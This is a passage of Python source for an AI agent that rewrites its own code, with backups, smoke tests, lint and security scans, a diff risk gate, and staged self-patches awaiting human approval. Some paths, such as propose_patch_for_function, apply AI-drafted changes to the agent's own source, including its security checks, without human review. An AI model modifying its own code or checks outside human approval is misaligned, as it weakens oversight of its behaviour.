    if not backup:
        return False, "No backup found to roll back to."
    shutil.copy(workpath(backup), workpath(SELF_FILE))
    return True, "Rolled back " + SELF_FILE + " to " + backup + ". Restart to use the restored version."

def verify_self_runs(filepath=None, timeout=10):
    """
    Runtime smoke-test — goes beyond py_compile (which only catches
    syntax errors) by actually launching the script and feeding it
    'quit' on stdin, then checking it exits cleanly with no traceback
    before main_loop's first prompt. This is what catches the case the
    user is worried about: an update that compiles fine but is actually
    broken (NameError, missing import, broken startup logic, etc).
    Returns (ok: bool, detail: str).
    """
    filepath = filepath or workpath(SELF_FILE)
    try:
        result = subprocess.run(
            ["python3", filepath],
            input="quit\n",
            capture_output=True, text=True, timeout=timeout,
            cwd=os.path.dirname(os.path.abspath(filepath)) or "."
        )
    except subprocess.TimeoutExpired:
        return False, "Smoke test timed out after " + str(timeout) + "s (script may be hanging on startup)."
    except Exception as e:
        return False, "Smoke test could not run the script: " + str(e)

    stderr_tail = result.stderr.strip()
    if "Traceback (most recent call last)" in stderr_tail:
        return False, "Script crashed on startup:\n" + stderr_tail[-500:]
    if result.returncode not in (0, None):
        return False, "Script exited with non-zero status " + str(result.returncode) + ":\n" + stderr_tail[-500:]
    return True, "Smoke test passed — script starts, reaches the prompt, and exits cleanly."

# ============================================================
# SELF-AWARENESS CHECK
# ============================================================
# A local, deterministic health check of main.py itself — no AI call,
# runs instantly. Checks the things that matter most for a script that
# can rewrite itself: does it still compile, does it pass its own
# security scanner, and are there structural warning signs (giant
# functions, no backups yet). Runs automatically at startup and right
# after every self-upgrade, so problems surface immediately instead of
# silently piling up.

def run_lint_checks(path, timeout=45):
    """
    Runs ruff (general lint) and bandit (security-focused static analysis)
    against `path`, if they're installed. Both are optional — if either
    binary isn't found on PATH, that check is silently skipped rather than
    failing self_awareness_check() outright. This is deliberately
    "fail open" the same way _find_nix_chromium() is: an environment
    without these tools installed shouldn't be treated as broken, just
    less thoroughly checked.
    Returns a list of short issue strings (empty if nothing found / tools
    not available).
    """
    issues = []

    if shutil.which("ruff"):
        try:
            result = subprocess.run(
                ["ruff", "check", "--quiet", path],
                capture_output=True, text=True, timeout=timeout
            )
            if result.returncode != 0 and result.stdout.strip():
                lint_lines = [l for l in result.stdout.strip().split("\n") if l.strip()]
                issues.append("ruff found " + str(len(lint_lines)) + " lint issue(s), e.g.: " +
                               " | ".join(lint_lines[:3]))
        except subprocess.TimeoutExpired:
            issues.append("ruff check timed out after " + str(timeout) + "s — skipped.")
        except Exception as e:
            issues.append("ruff check could not run: " + str(e))

    if shutil.which("bandit"):
        try:
            result = subprocess.run(
                ["bandit", "-q", "-r", path, "-ll"],  # -ll = only medium+ severity, keeps noise down
                capture_output=True, text=True, timeout=timeout
            )
            if result.returncode != 0 and result.stdout.strip():
                findings = [l.strip() for l in result.stdout.split("\n") if l.strip().startswith(">> Issue:")]
                if findings:
                    issues.append("bandit found " + str(len(findings)) + " security issue(s), e.g.: " +
                                   " | ".join(findings[:3]))
                else:
                    issues.append("bandit flagged something — run 'bandit -r " + path + "' manually to see details.")
        except subprocess.TimeoutExpired:
            issues.append("bandit scan timed out after " + str(timeout) + "s — skipped.")
        except Exception as e:
            issues.append("bandit scan could not run: " + str(e))

    return issues

def self_awareness_check():
    """Returns (ok: bool, report: str) — plain-English, no jargon."""
    path = workpath(SELF_FILE)
    if not os.path.exists(path):
        return True, "Couldn't find " + SELF_FILE + " to check — skipping."
    code = read_file(path)
    issues = []

    check = subprocess.run(["python3", "-m", "py_compile", path], capture_output=True, text=True, timeout=15)
    if check.returncode != 0:
        issues.append(SELF_FILE + " does not run right now — it has a syntax problem: " + check.stderr.strip()[:300])

    sec_ok, sec_reason = check_security(code)
    if not sec_ok:
        issues.append("My own security scanner flagged something in my own code: " + sec_reason)

    issues.extend(run_lint_checks(path))

    try:
        tree = ast.parse(code)
        funcs = [n for n in ast.walk(tree) if isinstance(n, ast.FunctionDef)]
        huge = [f.name for f in funcs if (f.end_lineno or f.lineno) - f.lineno > 150]
        if huge:
            issues.append(str(len(huge)) + " function(s) have gotten very long and could use splitting up: " + ", ".join(huge[:5]))
    except SyntaxError:
        pass  # already reported by the compile check above

    if not list_backups():
        issues.append("No backup of " + SELF_FILE + " exists yet — the first self-upgrade will create one automatically.")

    if not issues:
        return True, "Self-check passed — I compile fine, pass my own security scan and lint/security tooling, and nothing structurally looks off."
    return False, "Self-check found " + str(len(issues)) + " thing(s) worth a look:\n- " + "\n- ".join(issues)

def apply_self_upgrade(function_code):
    if __name__ != "__main__":
        return False, "Self-upgrade only allowed when running as __main__."
    backup_main()
    current = read_file(SELF_FILE)
    # BUG FIX (part 2 — the bigger one): the marker used to sit INSIDE
    # main_loop()'s body (right after "global conversation_history", at
    # 4-space indent). Inserting function_code there — a column-0 "def
    # ...:", which is this function's entire documented purpose — silently
    # ends main_loop() right at that point (it becomes just "global
    # conversation_history" and nothing else) and swallows every statement
    # that used to follow — the entire while-True command loop included —
    # into the body of the newly inserted function instead. Confirmed by
    # a standalone repro: py_compile passes clean (100% valid Python,
    # indentation just doesn't mean what you'd want), so this was never
    # caught by the compile check; it would only have surfaced as the
    # agent doing nothing at all after a "successful" self-upgrade +
    # restart. Anchoring on "def main_loop():" itself instead — a column-0
    # line — and inserting BEFORE it keeps the new function a proper
    # top-level sibling, with no risk of merging into another function's
    # body no matter what function_code contains.
    marker = "\ndef main_loop():"
    if marker not in current:
        return False, "Could not find insertion point."
    if current.count(marker) > 1:
        return False, "Insertion point is ambiguous (found more than once) — refusing to guess."
    write_file(SELF_FILE, current.replace(marker, "\n\n" + function_code.strip() + "\n" + marker, 1))
    check = subprocess.run(["python3", "-m", "py_compile", SELF_FILE], capture_output=True, text=True, timeout=15)
    if check.returncode != 0:
        ok, rb_msg = restore_latest_backup()
        return False, "Syntax error, rolled back:\n" + check.stderr
    # Beyond syntax: actually try running the patched file so a change
    # that compiles but breaks at startup (NameError, bad logic in the
    # new code, etc.) also gets caught and rolled back automatically,
    # instead of only being discovered the next time someone restarts.
    run_ok, run_detail = verify_self_runs()
    if not run_ok:
        restore_latest_backup()
        return False, "Update broke the program at runtime, rolled back automatically:\n" + run_detail
    sa_ok, sa_report = self_awareness_check()
    extra = "" if sa_ok else "\n[self-check] " + sa_report
    return True, "Applied and verified (compiles + runs cleanly). Restart to use new command." + extra

# ------------------------------------------------------------
# FEATURE 5: Diff-based self-upgrade
# ------------------------------------------------------------
# apply_self_upgrade() above only ever *inserts* a brand-new whole
# function at a fixed marker — it can't touch existing code, and every
# self-upgrade is an all-or-nothing function-sized blob. apply_patch()
# applies a small unified diff (the same format `diff -u` / git
# produces) directly to main.py, so the dreamer/reflect flow can make
# narrow, reviewable edits to existing functions instead of only ever
# bolting new ones on. Same safety envelope as apply_self_upgrade:
# backup first, py_compile to verify, roll back on any failure.

def _parse_unified_diff(diff_text):
    """
    Minimal unified-diff parser (no external deps — bash_tool has no
    network access to pip install anything here). Returns a list of
    hunks: (orig_start, orig_lines_removed_or_context, new_lines).
    orig_lines_removed_or_context / new_lines are lists of raw text
    lines (no leading +/-/space marker, no trailing newline).
    Raises ValueError on anything it can't parse — callers should treat
    that as "don't apply this patch".
    """
    hunk_re = re.compile(r"^@@ -(\d+)(?:,(\d+))? \+(\d+)(?:,(\d+))? @@")
    lines = diff_text.splitlines()
    hunks = []
    i = 0
    while i < len(lines):
        m = hunk_re.match(lines[i])
        if not m:
            i += 1
            continue
        orig_start = int(m.group(1))
        i += 1
        old_block, new_block = [], []
        while i < len(lines) and not lines[i].startswith("@@"):
            line = lines[i]
            if line.startswith("-"):
                old_block.append(line[1:])
            elif line.startswith("+"):
                new_block.append(line[1:])
            elif line.startswith(" "):
                old_block.append(line[1:])
                new_block.append(line[1:])
            elif line.strip() == "" or line.startswith("\\"):
                pass
            else:
                raise ValueError("Unrecognized diff line: " + line)
            i += 1
        hunks.append((orig_start, old_block, new_block))
    if not hunks:
        raise ValueError("No hunks found in diff.")
    return hunks

def apply_unified_diff(filename, diff_text):
    """
    Applies a unified diff to filename. Matches each hunk's old_block
    against the file by exact content search (not by line number, since
    AI-generated line numbers are often slightly off) — safer than
    trusting @@ offsets blindly. Returns (success, message).
    """
    try:
        hunks = _parse_unified_diff(diff_text)
    except ValueError as e:
        return False, "Could not parse diff: " + str(e)
    if not os.path.exists(filename):
        return False, "File not found: " + filename
    content = read_file(filename)
    for orig_start, old_block, new_block in hunks:
        old_text = "\n".join(old_block)
        new_text = "\n".join(new_block)
        if old_text not in content:
            return False, "Hunk did not match file content (context drifted) near line " + str(orig_start) + "."
        if content.count(old_text) > 1:
            return False, "Hunk matched more than once — too ambiguous to apply safely near line " + str(orig_start) + "."
        content = content.replace(old_text, new_text, 1)
    write_file(filename, content)
    return True, "Patch applied to " + filename + "."

def assess_patch_risk(diff_text, filename=None, max_removed_ratio=0.05):
    """
    Risk gate for self-upgrade diffs, run BEFORE apply_unified_diff
    touches the file. py_compile only catches syntax errors — it says
    nothing about whether the agent just deleted half of itself or
    removed a function that other code still calls. This is a cheap
    static check, not a guarantee, but it catches the obvious ways a
    self-upgrade can quietly break the agent.

    Returns (ok, reason). ok=False means apply_self_upgrade_patch will
    refuse to apply the diff at all.
    """
    filename = filename or SELF_FILE
    try:
        hunks = _parse_unified_diff(diff_text)
    except ValueError as e:
        return False, "Could not parse diff: " + str(e)

    if not os.path.exists(filename):
        return False, "File not found: " + filename
    current = read_file(filename)
    current_line_count = max(len(current.splitlines()), 1)

    removed_lines = 0
    removed_def_names = set()
    added_text_blob = []

    for orig_start, old_block, new_block in hunks:
        # Lines present in old_block but not new_block were net-removed
        # (context lines appear in both, so this approximates true deletions).
        old_set, new_set = list(old_block), list(new_block)
        removed_lines += max(len(old_set) - len(new_set), 0)
        for line in old_set:
            m = re.match(r"\s*def\s+(\w+)\s*\(", line)
            if m:
                removed_def_names.add(m.group(1))
        added_text_blob.extend(new_set)

    # Did a removed function name still get added back (renamed/edited in place)?
    added_blob_text = "\n".join(added_text_blob)
    truly_removed_defs = [
        name for name in removed_def_names
        if re.search(r"\bdef\s+" + re.escape(name) + r"\s*\(", added_blob_text) is None
    ]

    if truly_removed_defs:
        # Check whether anything else in the file still calls these names —
        # if so, applying the diff would leave dangling calls.
        still_called = []
        for name in truly_removed_defs:
            call_pattern = re.compile(r"\b" + re.escape(name) + r"\s*\(")
            if len(call_pattern.findall(current)) > 1:  # >1 because the def line itself matches
                still_called.append(name)
        if still_called:
            return False, ("Diff removes function(s) still referenced elsewhere: " +
                            ", ".join(still_called) + ". Refusing to apply.")

    removed_ratio = removed_lines / current_line_count
    if removed_ratio > max_removed_ratio:
        return False, ("Diff removes " + str(removed_lines) + " lines (" +
                        str(round(removed_ratio * 100, 1)) + "% of file), exceeding the " +
                        str(round(max_removed_ratio * 100, 1)) + "% safety threshold. Refusing to apply.")

    return True, "OK: removes " + str(removed_lines) + " lines, no dangling references detected."

def preview_patch(diff_text, filename=None):
    """
    Read-only preview: shows the risk assessment and a compact summary
    of what a diff would change, WITHOUT touching the file. Use this
    before safeupgrade/patch commands to sanity-check a diff first.
    """
    filename = filename or SELF_FILE
    ok, reason = assess_patch_risk(diff_text, filename)
    try:
        hunks = _parse_unified_diff(diff_text)
        hunk_summary = "\n".join(
            "  hunk near line " + str(start) + ": -" + str(len(old)) + " / +" + str(len(new))
            for start, old, new in hunks
        )
    except ValueError as e:
        hunk_summary = "  (could not parse hunks: " + str(e) + ")"
    verdict = "SAFE TO APPLY" if ok else "BLOCKED"
    return verdict + " — " + reason + "\n" + hunk_summary

def apply_self_upgrade_patch(diff_text):
    """
    Diff-based counterpart to apply_self_upgrade(): patches main.py
    in place with backup + py_compile verification + automatic
    rollback, instead of inserting a whole new function. Now gated by
    assess_patch_risk() so an oversized or dangling-reference diff is
    rejected before it ever touches the file on disk.
    """
    if __name__ != "__main__":
        return False, "Self-upgrade only allowed when running as __main__."
    risk_ok, risk_reason = assess_patch_risk(diff_text, SELF_FILE)
    if not risk_ok:
        return False, "Risk check failed: " + risk_reason
    backup_main()
    ok, msg = apply_unified_diff(SELF_FILE, diff_text)
    if not ok:
        return False, msg
    check = subprocess.run(["python3", "-m", "py_compile", SELF_FILE], capture_output=True, text=True, timeout=15)
    if check.returncode != 0:
        restore_latest_backup()
        return False, "Syntax error, rolled back:\n" + check.stderr
    run_ok, run_detail = verify_self_runs()
    if not run_ok:
        restore_latest_backup()
        return False, "Patch broke the program at runtime, rolled back automatically:\n" + run_detail
    sa_ok, sa_report = self_awareness_check()
    extra = "" if sa_ok else "\n[self-check] " + sa_report
    return True, "Patch applied and verified (risk check: " + risk_reason + "). Restart to use updated code." + extra

def propose_patch_for_function(function_name, change_description):
    """
    Asks the AI for a small unified diff scoped to one function instead
    of a full rewrite, then applies it via apply_self_upgrade_patch().
    This is the narrow-blast-radius alternative to the 'reflect' flow's
    full-function apply_self_upgrade(). Returns (success, message).

    BUG FIX: same class of bug as _draft_subsystem_diff() — this used
    to send current[:6000] no matter which function was named, but a
    13,000+ line file has the vast majority of its functions well
    outside the first 6000 characters (~120 lines). The AI was being
    asked to patch a function it usually couldn't even see, producing
    diffs that either don't match anything (apply_unified_diff then
    correctly refuses them) or hallucinate plausible-but-wrong context.
    Fixed by locating the actual `def function_name(` line first and
    sending a window centered on it.
    """
    current = read_file(SELF_FILE)
    match = re.search(r"^def\s+" + re.escape(function_name) + r"\s*\(", current, re.MULTILINE)
    if not match:
        return False, "Could not find a top-level function named '" + function_name + "' in " + SELF_FILE + "."
    window_start = max(0, match.start() - 2000)
    window_end = min(len(current), match.start() + 6000)
    file_excerpt = current[window_start:window_end]
    prompt = (
        "Here is an excerpt from a Python file, centered on the function you need to change. "
        "Write a small unified diff (like `diff -u` output, with @@ hunk headers) that changes ONLY the function `" + function_name + "` "
        "to do this: " + change_description + ". "
        "Keep the diff as small as possible. Reply with ONLY the diff, no explanation, no markdown fences.\n\n"
        "FILE EXCERPT (only the region around `" + function_name + "`, not the whole file):\n" + file_excerpt
    )
    diff_text = strip_fences(ask_ai(prompt))
    if not diff_text.strip():
        return False, "AI returned no diff."
    return apply_self_upgrade_patch(diff_text)

# ============================================================
# SELF-AUDIT CRITIC AGENT
# ============================================================
# Turns self_awareness_check() (previously read-only) inward with teeth:
# for each concrete problem it finds in the agent's OWN code, asks the AI
# to draft the smallest possible fix as a unified diff, risk-checks it
# with the existing assess_patch_risk() gate, and STAGES it for approval.
# Nothing here ever touches main.py directly — approve_self_patch() is
# the only function that applies anything, and it goes through the exact
# same backup/compile/runtime-verify/auto-rollback envelope as every
# other self-upgrade path. Mirrors the GITHUB BOUNTY LEADS
# pending_approval/id/notify pattern on purpose, for the same reason:
# an agent proposing changes to itself is exactly the kind of action
# that should never be one AI call away from irreversible.

SELF_PATCHES_FILE = workpath("self_patches.json")
# BUG FIX: same lost-update race as bounty_leads.json (see _bounty_leads_lock
# notes elsewhere) — this lock was only ever held inside load_self_patches()/
# save_self_patches() individually, not across the full read-modify-write
# critical sections in run_self_audit() / approve_self_patch() /
# reject_self_patch(), which each did load...(slow AI/apply work)...save as
# two separate lock acquisitions. That left a window where a concurrent
# approve/reject/audit could save a stale snapshot and silently erase
# another one's change — worst case, losing track of whether a patch to
# the agent's OWN source code was actually applied. See the fixed bodies
# of those three functions below for the atomic commit-point pattern.
_self_patches_lock = threading.Lock()

def load_self_patches():
    with _self_patches_lock:
        return read_json_file(SELF_PATCHES_FILE, [])

def save_self_patches(patches):
    with _self_patches_lock:
        write_file(SELF_PATCHES_FILE, json.dumps(patches, indent=2))

def _next_self_patch_id(patches):
    existing = [int(p["id"][1:]) for p in patches if p.get("id", "").startswith("p") and p["id"][1:].isdigit()]
    return "p" + str(max(existing, default=0) + 1)

def _propose_diff_for_issue(issue_description):
    """
    Asks the AI for the smallest possible unified diff against SELF_FILE
    that fixes ONE self-awareness-check finding, without touching
    unrelated behavior. Returns diff text, or "" if the model declines
    (explicitly, via SKIP) or the call fails — callers must treat empty
    as "no safe fix available", not as an error to retry.

    BUG FIX: same class of bug as _draft_subsystem_diff() /
    propose_patch_for_function() — this used to send current[:12000]
    (the first ~230 lines) for EVERY finding, regardless of where in a
    13,000+ line file the actual problem lives. self_awareness_check()'s
    most common finding ("N function(s) have gotten very long...") names
    the offending function(s) by name, but they're almost never in the
    first 230 lines, so the AI was routinely asked to fix code it
    couldn't see. Fixed by cross-referencing any function name(s)
    mentioned in issue_description against the real function names in
    the file (via ast) and, when exactly one match is found, centering
    the excerpt on that function. Findings that don't name a specific
    function (syntax errors, security-scanner hits, "no backup yet")
    fall back to the original first-N-characters excerpt, since those
    are either near the top of the file or don't have a single function
    to anchor on anyway.
    """
    current = read_file(workpath(SELF_FILE))
    file_excerpt = current[:12000]
    try:
        tree = ast.parse(current)
        all_func_names = {n.name for n in ast.walk(tree) if isinstance(n, ast.FunctionDef)}
        mentioned = [name for name in all_func_names if re.search(r"\b" + re.escape(name) + r"\b", issue_description)]
        if len(mentioned) == 1:
            match = re.search(r"^def\s+" + re.escape(mentioned[0]) + r"\s*\(", current, re.MULTILINE)
            if match:
                window_start = max(0, match.start() - 2000)
                window_end = min(len(current), match.start() + 10000)
                file_excerpt = current[window_start:window_end]
    except SyntaxError:
        pass  # fall back to the default excerpt; the syntax-error finding itself will explain why
    prompt = ("You are reviewing your OWN source code for a specific problem found by an automated "
        "self-check. Problem: " + issue_description + "\n\n"
        "Write the SMALLEST possible unified diff (like `diff -u` output, with @@ hunk headers) that "
        "fixes this ROOT CAUSE without changing unrelated behavior. If the problem is a huge function, "
        "prefer splitting out one clearly-scoped helper over a sweeping rewrite. Reply with ONLY the diff, "
        "no explanation, no markdown fences. If you cannot produce a safe, narrowly-scoped fix, reply with "
        "exactly: SKIP\n\nFILE EXCERPT (may not be the whole file):\n" + file_excerpt)
    diff_text = strip_fences(ask_ai(prompt)).strip()
    if not diff_text or diff_text.upper() == "SKIP" or diff_text.startswith("ERROR"):
        return ""
    return diff_text

def run_self_audit():
    """
    The critic pass: runs self_awareness_check() to find concrete
    problems, then drafts and risk-gates a narrow fix per finding
    (capped at 5 per run so review batches stay small), and stages
    anything that survives assess_patch_risk() in self_patches.json.
    Never applies anything itself. Returns a summary string.
    """
    ok, report = self_awareness_check()
    if ok:
        return "Self-audit: no issues found. " + report

    findings = [line[2:].strip() for line in report.split("\n") if line.strip().startswith("- ")]
    if not findings:
        findings = [report]

    patches = load_self_patches()
    already_open = {p["finding"] for p in patches if p["status"] == "pending_approval"}
    proposed, skipped, risk_blocked = 0, 0, 0
    new_patches = []

    for finding in findings[:5]:
        if finding in already_open:
            continue  # already staged from a previous audit run, don't duplicate
        diff_text = _propose_diff_for_issue(finding)
        if not diff_text:
            skipped += 1
            continue
        risk_ok, risk_reason = assess_patch_risk(diff_text)
        if not risk_ok:
            risk_blocked += 1
            print("Self-audit: discarded a proposed fix for '" + finding[:80] + "' — " + risk_reason)
            continue
        patch = {
            "id": None,  # BUG FIX: assigned atomically at commit time below
            "finding": finding,
            "diff": diff_text,
            "risk_assessment": risk_reason,
            "status": "pending_approval",
            "found_at": time.time()
        }
        new_patches.append(patch)
        proposed += 1

    # BUG FIX: see _self_patches_lock's definition above. The loop above
    # makes several slow AI calls (_propose_diff_for_issue, assess_patch_risk)
    # against the `patches`/`already_open` snapshot loaded at the top of this
    # function. Re-load fresh under the lock at commit time, re-check for
    # duplicate findings and assign ids against that fresh list, then append
    # and save — all inside one critical section — so a concurrent
    # approve/reject/audit can't be clobbered by this stale snapshot.
    if new_patches:
        with _self_patches_lock:
            fresh_patches = read_json_file(SELF_PATCHES_FILE, [])
            fresh_open = {p["finding"] for p in fresh_patches if p["status"] == "pending_approval"}
            for patch in new_patches:
                if patch["finding"] in fresh_open:
                    continue  # someone else staged a fix for this same finding meanwhile
                patch["id"] = _next_self_patch_id(fresh_patches)
                fresh_patches.append(patch)
            write_file(SELF_PATCHES_FILE, json.dumps(fresh_patches, indent=2))
    committed_patches = [p for p in new_patches if p["id"] is not None]
    if committed_patches:
        preview = "\n".join("- [" + p["id"] + "] " + p["finding"][:80] for p in committed_patches)
        notify_telegram(
            "Self-audit: " + str(len(committed_patches)) + " proposed fix(es) to my own code, awaiting review\n" + preview +
            "\nUse 'selfpatches' to review, 'approvepatch: <id>' to apply, 'rejectpatch: <id>' to discard."
        )
    return ("Self-audit found " + str(len(findings)) + " issue(s). Proposed " + str(proposed) +
            " reviewable fix(es), " + str(risk_blocked) + " discarded as too risky, " + str(skipped) + " skipped.")

def list_self_patches():
    pending = [p for p in load_self_patches() if p["status"] == "pending_approval"]
    if not pending:
        return "No pending self-patches."
    lines = ["Pending self-patches (" + str(len(pending)) + "):"]
    for p in pending:
        lines.append("[" + p["id"] + "] " + p["finding"][:100] + " (risk check: " + p["risk_assessment"][:60] + ")")
    return "\n".join(lines)

def approve_self_patch(patch_id):
    """Applies a staged self-audit patch through apply_self_upgrade_patch()
    — same backup + risk re-check + compile + runtime-verify + automatic
    rollback envelope as any other self-upgrade path."""
    patches = load_self_patches()
    patch = next((p for p in patches if p["id"] == patch_id), None)
    if not patch:
        return "No self-patch with id " + patch_id + ". Use 'selfpatches' to list them."
    if patch["status"] != "pending_approval":
        return "Patch " + patch_id + " is already " + patch["status"] + "."
    success, msg = apply_self_upgrade_patch(patch["diff"])
    # BUG FIX: apply_self_upgrade_patch() above is slow (backup + risk
    # re-check + compile + runtime-verify + possible rollback) and touches
    # the agent's own source file. Re-load fresh under the lock and apply
    # our status change to that copy — see _self_patches_lock's definition
    # above — rather than saving the `patches` snapshot from the top of
    # this function, so we don't clobber a concurrent audit/approve/reject.
    with _self_patches_lock:
        fresh_patches = read_json_file(SELF_PATCHES_FILE, [])
        fresh_patch = next((p for p in fresh_patches if p["id"] == patch_id), None)
        if fresh_patch is not None:
            fresh_patch["status"] = "applied" if success else "apply_failed"
            fresh_patch["apply_result"] = msg
        write_file(SELF_PATCHES_FILE, json.dumps(fresh_patches, indent=2))
    return msg

def reject_self_patch(patch_id):
    # BUG FIX: load+modify+save is now one atomic critical section instead
    # of two separate lock acquisitions — see _self_patches_lock's
    # definition above.
    with _self_patches_lock:
        patches = read_json_file(SELF_PATCHES_FILE, [])
        patch = next((p for p in patches if p["id"] == patch_id), None)
        if not patch:
            return "No self-patch with id " + patch_id + ". Use 'selfpatches' to list them."
        patch["status"] = "rejected"
        write_file(SELF_PATCHES_FILE, json.dumps(patches, indent=2))
    return "Rejected patch " + patch_id + "."

# ============================================================
# ARCHITECTURAL SELF-MODIFICATION (step 3 of 4)
# ============================================================
# Everything above (run_self_audit/approve_self_patch) only ever patches
# an EXISTING function via a small diff. This is different in kind: it
# lets the agent propose an entirely NEW subsystem — new top-level
# function(s) that didn't exist before — when it hits a structural wall
# nothing already in the file can solve. That's the highest blast-radius
# change this codebase allows, so it's the most gated:
#
#   1. council_debate() reviews the PROPOSAL — not code, just the idea
#      and why the wall requires it — before anything gets written.
#      A REJECT/REVISE stops here; no diff is ever drafted.
#   2. Only on council APPROVE does _draft_subsystem_diff() ask the AI
#      for an actual (purely-additive) unified diff.
#   3. That diff still goes through assess_patch_risk() like every
#      other self-upgrade path.
#   4. It lands in self_patches.json as "pending_approval" — same file,
#      same approve_self_patch()/reject_self_patch() as a normal
#      self-audit fix, same backup/compile/runtime-verify/auto-rollback
#      envelope. This function NEVER applies anything itself.

def _draft_subsystem_diff(proposal_text):
    """
    Only called after council approval. Asks the AI for a unified diff
    that adds the proposed subsystem as new top-level function(s),
    anchored on the SELF-AUDIT CRITIC AGENT section header so the
    insertion point is unambiguous. Instructed to be purely additive —
    assess_patch_risk() still re-checks that independently below.
    Returns diff text, or "" if the model declines (SKIP) or fails.

    BUG FIX: this used to send current[:12000] — the first 12,000
    characters of the file — as "the file" the AI should anchor its
    diff on. But the anchor line itself ("# SELF-AUDIT CRITIC AGENT")
    lives around character 591,000 (~line 11,662) in a 687,000-character
    file: nowhere near the first 12,000 characters actually shown.
    The model was being told "use this exact line as unchanged context"
    for a line it had literally never seen, which made this feature
    non-functional — every real attempt either hallucinates plausible-
    looking context that apply_unified_diff()'s exact-match check then
    rejects ("context drifted"), or the model just can't find the
    anchor at all and returns SKIP. Fixed by locating the anchor in the
    actual file first and sending a window CENTERED on it, so the AI
    can see (and therefore correctly reproduce) the real surrounding
    lines its diff hunk needs to match.
    """
    current = read_file(workpath(SELF_FILE))
    anchor = "# SELF-AUDIT CRITIC AGENT"
    anchor_idx = current.find(anchor)
    if anchor_idx == -1:
        return ""  # anchor comment was renamed/removed elsewhere — nothing safe to insert against
    window_before, window_after = 4000, 8000
    window_start = max(0, anchor_idx - window_before)
    window_end = min(len(current), anchor_idx + window_after)
    file_excerpt = current[window_start:window_end]
    prompt = (
        "You are implementing a NEW subsystem in your own source code, based on a proposal "
        "that a three-role review council has already approved. Proposal:\n" + proposal_text +
        "\n\nWrite a unified diff (like `diff -u` output, with @@ hunk headers) that adds this "
        "subsystem as new top-level function(s), inserted immediately before the line:\n" +
        anchor + "\n\nUse that exact line as unchanged context in your hunk so the insertion point "
        "is unambiguous. Keep the diff PURELY ADDITIVE — do not modify or remove any existing line. "
        "Reply with ONLY the diff, no explanation, no markdown fences. If you cannot produce a safe, "
        "purely-additive diff, reply with exactly: SKIP\n\nFILE EXCERPT (this is only the region of "
        "the file around the anchor line above, not the whole file — the anchor line IS included in "
        "this excerpt):\n" + file_excerpt
    )
    diff_text = strip_fences(ask_ai(prompt)).strip()
    if not diff_text or diff_text.upper() == "SKIP" or diff_text.startswith("ERROR"):
        return ""
    return diff_text

def propose_architectural_subsystem(wall_description):
    """
    Gated entry point for architectural self-modification. Takes a
    description of the structural wall motivating a new subsystem,
    puts the PROPOSAL (not code) in front of council_debate() first,
    and only drafts + stages a diff on APPROVE. Returns a summary
    string. Never applies anything itself — see module docstring above.
    """
    proposal = (
        "Proposed NEW subsystem (architectural self-modification — new top-level "
        "function(s), not a bugfix patch to something that already exists).\n\n"
        "Structural wall that motivated this:\n" + wall_description + "\n\n"
        "Judge whether this is worth building at all — value, duplication, blast "
        "radius — not just whether it's technically feasible."
    )
    verdict = council_debate(proposal, context="Architectural self-modification proposal.")

    if verdict["decision"] != "APPROVE":
        log_rejected_tool(
            "[architectural] " + wall_description[:200],
            "Council " + verdict["decision"] + " (id " + verdict["id"] + "): " + verdict["summary"][:300]
        )
        return ("Council " + verdict["decision"] + " on architectural proposal (council id " +
                verdict["id"] + "). Not drafted. " + verdict["summary"])

    diff_text = _draft_subsystem_diff(wall_description + "\n\nCouncil-approved synthesis:\n" + verdict["summary"])
    if not diff_text:
        return "Council approved (id " + verdict["id"] + ") but no safe purely-additive diff could be drafted."

    risk_ok, risk_reason = assess_patch_risk(diff_text)
    if not risk_ok:
        return "Council approved (id " + verdict["id"] + ") but risk check blocked the diff: " + risk_reason

    # Same atomic commit-point pattern as run_self_audit() — reload fresh
    # under the lock and assign the id at commit time, not from a stale
    # snapshot taken before the (slow) council + AI drafting calls above.
    with _self_patches_lock:
        fresh_patches = read_json_file(SELF_PATCHES_FILE, [])
        patch = {
            "id": _next_self_patch_id(fresh_patches),
            "finding": "[architectural] " + wall_description[:200],
            "diff": diff_text,
            "risk_assessment": risk_reason,
            "status": "pending_approval",
            "kind": "architectural_subsystem",
            "council_id": verdict["id"],
            "found_at": time.time(),
        }
        fresh_patches.append(patch)
        write_file(SELF_PATCHES_FILE, json.dumps(fresh_patches, indent=2))

    notify_telegram(
        "Architectural proposal APPROVED by council (id " + verdict["id"] + ") and staged as [" +
        patch["id"] + "]. This is a NEW subsystem, not a patch — review carefully.\n" +
        "Use 'selfpatches' to review, 'approvepatch: " + patch["id"] + "' to apply, 'rejectpatch: " +
        patch["id"] + "' to discard."
    )
    return ("Council APPROVED (id " + verdict["id"] + "). Staged as [" + patch["id"] +
            "] pending human approval. " + verdict["summary"])

# ============================================================
# SEMANTIC MEMORY / KNOWLEDGE GRAPH
# ============================================================
# tools_index.json, decisions_log.json, agent_lessons.txt and
# agents_index.json have always held related information — which tool a
# decision picked, which lessons came out of which failures, which agent
# built which tools — but only ever as flat, disconnected files. Nothing
# could answer a question that spans them ("what have I built for lead
# gen and is any of it actually trustworthy?") without a human manually
# cross-referencing four files.
#
# This builds an actual graph (nodes + typed edges) over that same data
# and answers natural-language questions against it: TF-IDF-rank which
# nodes are relevant (reusing semantic_rank/_build_tfidf — no new
# dependencies, no embeddings API, same "cheap and local" philosophy as
# find_matching_tool), pull in their direct neighbors for context, and
# have the AI answer strictly from those retrieved facts. This is
# read-only — it never mutates tools_index.json etc., it just indexes
# what's already there.

KNOWLEDGE_GRAPH_FILE = workpath("knowledge_graph.json")
_kg_lock = threading.Lock()
KG_STALE_SECONDS = 3600  # auto-rebuild if the graph is older than this when queried
LESSON_LINK_THRESHOLD = 0.3  # min TF-IDF similarity to soft-link a lesson to a tool

def load_knowledge_graph():
    with _kg_lock:
        return read_json_file(KNOWLEDGE_GRAPH_FILE, {"built_at": 0, "nodes": {}, "edges": []})

def save_knowledge_graph(graph):
    with _kg_lock:
        write_file(KNOWLEDGE_GRAPH_FILE, json.dumps(graph, indent=2))

def _kg_add_node(graph, node_id, node_type, label, meta=None):
    graph["nodes"][node_id] = {"type": node_type, "label": label[:300], "meta": meta or {}}

def _kg_add_edge(graph, from_id, to_id, relation):
    if from_id not in graph["nodes"] or to_id not in graph["nodes"]:
        return  # don't record edges to nodes that don't (or no longer) exist
    edge = {"from": from_id, "to": to_id, "relation": relation}
    if edge not in graph["edges"]:
        graph["edges"].append(edge)

def rebuild_knowledge_graph():
    """
    Full rebuild from source-of-truth files on disk. Cheap enough (pure
    local JSON/text parsing, one TF-IDF pass for lesson linking, no AI
    calls) to run on every query when stale rather than needing to be
